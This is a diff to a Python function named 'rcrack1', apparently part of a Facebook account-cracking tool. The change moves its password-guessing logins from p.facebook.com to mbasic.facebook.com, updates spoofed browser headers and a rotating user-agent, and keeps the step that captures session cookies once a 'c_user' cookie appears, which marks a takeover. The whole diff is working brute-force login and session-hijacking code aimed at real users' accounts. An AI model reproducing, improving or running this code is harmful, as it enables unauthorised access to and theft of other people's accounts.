@@ -231,33 +231,23 @@ def rcrack1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'p.facebook.com',
-            "method": 'page',
+            header_freefb = {'authority': 'mbasic.facebook.com',
+            "method": 'GET',
             "scheme": 'https',
-            'authority': 'p.facebook.com',
-            'x-fb-rlafr': '0',
-            'access-control-allow-origin': '*',
-            'facebook-api-version': 'v16.0',
-            'strict-transport-security': 'max-age=15552000',
-            'pragma': 'no-cache',
-            'cache-control': 'private, no-cache, no-store, must-revalidate',
-            'x-fb-request-id': 'AUr43zMsWWeZFHzOkGRPBeM',
-            'x-fb-trace-id': 'Cq0hhVhzMlz',
-            'x-fb-rev': '1007130069',
-            'x-fb-debug': 'IYVpFZQ4PoZeYrV7RPd45zq4IpWU4x06QZ8z2K773AGLnt+D+P0IWDVPU7jmS8F5PQdcRwmvWvLFn/TmWJ06Gw==',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
+            'referer': 'https://mbasic.facebook.com/',
             'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
             'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',    
+            'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Android 7.0; Mobile; rv:57.0) Gecko/57.0 Firefox/57.0 WhiteHat Security',}
-            lo = session.post('https://p.facebook.com/login/?li=nigVZLNWTZ3wDwKBvqdp5NLE&e=1348029&shbl=1&ref=dbl&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
+            'user-agent': pro}
+            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
